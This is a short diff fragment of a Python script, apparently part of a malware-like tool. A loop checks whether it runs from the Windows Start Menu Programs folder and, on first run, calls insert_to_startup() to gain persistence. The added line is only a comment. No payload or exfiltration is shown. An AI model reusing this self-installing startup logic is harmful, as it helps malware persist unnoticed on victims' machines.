@@ -79,6 +79,7 @@ first_run = True
 while True:
     try:
         # check if it's run in C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\programs
+        # We'll be using first_run var here incase it is the injection point so completely 0 duplicates.
         if os.getcwd() != os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs" and first_run is True:
             insert_to_startup()
             first_run = False
